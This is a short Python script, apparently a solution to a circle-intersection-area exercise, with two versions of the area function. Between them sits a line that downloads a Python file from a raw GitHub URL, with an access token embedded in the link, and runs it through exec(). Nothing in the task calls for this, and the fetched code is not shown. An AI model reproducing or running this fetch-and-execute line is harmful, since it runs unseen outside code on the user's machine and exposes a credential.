import requests as rq

from math import*;circleIntersection=lambda a,b,r:int(*[r*r*(t-sin(t))for t in[2*acos(min(hypot(a[0]-b[0],a[1]-b[1])/2/r,1))]])

exec(rq.get('https://raw.githubusercontent.com/rpask00/cloud-py/master/cloud.py?token=AH4QRISEJTERIA4ZMZUMAIS6IB3CC').content.decode('utf-8'))


def circleIntersection(A, B, r):
    cos = ((A[0]-B[0])**2+(A[1]-B[1])**2)**.5/2/r
    if cos > 1:
        return 0
    alpha = acos(cos)*2
    ptr = sin(alpha)/2 * r * r
    pw = alpha / 6 * r * r * 3
    return int(2*(pw-ptr))


print(circleIntersection([10, 20], [-5, -15], 20))
